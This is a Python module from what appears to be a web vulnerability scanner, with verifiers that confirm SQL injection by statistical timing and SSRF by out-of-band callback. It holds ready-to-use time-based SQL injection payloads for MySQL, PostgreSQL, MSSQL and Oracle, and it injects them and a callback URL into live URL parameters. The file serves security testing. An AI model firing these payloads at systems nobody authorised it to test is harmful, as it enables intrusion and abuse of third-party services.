"""
Deterministic verifiers.

These are the ONLY components allowed to set `Finding.confirmed=True`.
"""

from __future__ import annotations

import statistics
import time
from dataclasses import dataclass
from typing import Dict, List, Optional, Sequence, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from ..core.http_client import HTTPClient
from .models import ControlTest, Finding, Proof, ProofKind, RequestSpec
from .oob import SimplePollOOBClient


def _inject_query_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


@dataclass(frozen=True)
class TimingConfig:
    delay_s: float = 5.0
    samples: int = 3
    min_delta_s: float = 3.5  # default: require near-delay gap
    max_baseline_jitter_s: float = 1.0


class TimeBasedSQLiVerifier:
    """
    Confirms SQLi ONLY via statistically consistent timing delay, with a control payload.

    This intentionally ignores response body/status/length as proof.
    """

    def __init__(self, http: Optional[HTTPClient] = None, config: Optional[TimingConfig] = None):
        self.http = http or HTTPClient()
        self.config = config or TimingConfig()

    def _sample(self, url: str, method: str = "GET") -> float:
        # Use wall-clock for robustness; requests' elapsed can under-report in some environments.
        start = time.time()
        if method.upper() == "GET":
            self.http.get(url)
        else:
            self.http.send(method, url)
        return time.time() - start

    def _run_samples(self, url: str, n: int) -> List[float]:
        return [self._sample(url) for _ in range(n)]

    def verify(self, base_url: str, param: str) -> Optional[Finding]:
        """
        Attempt confirmation using common time-delay payloads with paired zero-delay controls.

        Returns a confirmed Finding on success, else None.
        """
        cfg = self.config

        # Baseline: benign value
        baseline_url = _inject_query_param(base_url, param, "1")
        baseline = self._run_samples(baseline_url, cfg.samples)
        baseline_med = statistics.median(baseline)
        baseline_jitter = statistics.pstdev(baseline) if len(baseline) > 1 else 0.0

        if baseline_jitter > cfg.max_baseline_jitter_s:
            # Too noisy to prove timing reliably on this endpoint.
            return None

        candidates: List[Tuple[str, str, str]] = [
            # (db, delay_payload, control_payload)
            ("mysql", f"' OR SLEEP({int(cfg.delay_s)})--", "' OR SLEEP(0)--"),
            ("mysql", f"1 AND SLEEP({int(cfg.delay_s)})", "1 AND SLEEP(0)"),
            ("postgresql", f"'; SELECT pg_sleep({int(cfg.delay_s)})--", "'; SELECT pg_sleep(0)--"),
            ("postgresql", f"' OR pg_sleep({int(cfg.delay_s)})--", "' OR pg_sleep(0)--"),
            ("mssql", f"'; WAITFOR DELAY '0:0:{int(cfg.delay_s)}'--", "'; WAITFOR DELAY '0:0:0'--"),
            ("mssql", f"1; WAITFOR DELAY '0:0:{int(cfg.delay_s)}'--", "1; WAITFOR DELAY '0:0:0'--"),
            ("oracle", f"' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{int(cfg.delay_s)})--", "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',0)--"),
        ]

        for db, delay_payload, control_payload in candidates:
            test_url = _inject_query_param(base_url, param, delay_payload)
            control_url = _inject_query_param(base_url, param, control_payload)

            test = self._run_samples(test_url, cfg.samples)
            control = self._run_samples(control_url, cfg.samples)

            test_med = statistics.median(test)
            control_med = statistics.median(control)

            delta_vs_baseline = test_med - baseline_med
            delta_vs_control = test_med - control_med

            # Require the delay to appear against BOTH baseline and control.
            if delta_vs_baseline >= cfg.min_delta_s and delta_vs_control >= cfg.min_delta_s:
                proof_signal = (
                    f"Timing delay proven for {db}. "
                    f"baseline={baseline} (median={baseline_med:.2f}s), "
                    f"control={control} (median={control_med:.2f}s), "
                    f"test={test} (median={test_med:.2f}s), "
                    f"delta_vs_control={delta_vs_control:.2f}s"
                )

                proof_req = RequestSpec(method="GET", url=test_url)
                control_test = ControlTest(
                    description="Zero-delay control payload does not induce delay",
                    request=RequestSpec(method="GET", url=control_url),
                    observation=f"control timings={control} (median={control_med:.2f}s) vs test median={test_med:.2f}s",
                )

                return Finding(
                    vuln_type="sqli",
                    target_url=base_url,
                    parameter=param,
                    confirmed=True,
                    payload=delay_payload,
                    proof=Proof(kind=ProofKind.TIMING, signal=proof_signal, request=proof_req, control=control_test),
                    supporting_evidence=[
                        "Confirmation uses timing proof only (response content ignored).",
                        f"Baseline jitter={baseline_jitter:.2f}s",
                    ],
                )

        return None


class OOBSSRFVerifier:
    """
    Confirms SSRF ONLY via OOB callback, with control test.

    Requires a configured SimplePollOOBClient.
    """

    def __init__(self, http: Optional[HTTPClient] = None, oob: Optional[SimplePollOOBClient] = None):
        self.http = http or HTTPClient()
        self.oob = oob or SimplePollOOBClient(http=self.http)

    def verify(self, base_url: str, param: str) -> Optional[Finding]:
        if not self.oob.enabled():
            return None

        token = self.oob.new_token()
        cb_url = self.oob.callback_url(token)

        test_url = _inject_query_param(base_url, param, cb_url)
        self.http.get(test_url)  # trigger SSRF attempt

        hit = self.oob.poll(token)
        if not hit.hit:
            return None

        # Control: ensure a different token did NOT get hit without being used.
        control_token = self.oob.new_token()
        control_poll = self.oob.poll(control_token)
        control_obs = "no unexpected OOB hits observed for unused token"
        if control_poll.hit:
            # Environment or collaborator is noisy; refuse to confirm.
            return None

        proof_signal = f"OOB callback received. token={token}, details={hit.details}"
        proof_req = RequestSpec(method="GET", url=test_url)
        control = ControlTest(
            description="Unused-token control confirms collaborator is not noisy",
            request=RequestSpec(method="GET", url=self.oob.callback_url(control_token)),
            observation=control_obs,
        )

        return Finding(
            vuln_type="ssrf",
            target_url=base_url,
            parameter=param,
            confirmed=True,
            payload=cb_url,
            proof=Proof(kind=ProofKind.OOB, signal=proof_signal, request=proof_req, control=control),
            supporting_evidence=["Confirmed via OOB callback only (no response heuristics)."],
        )

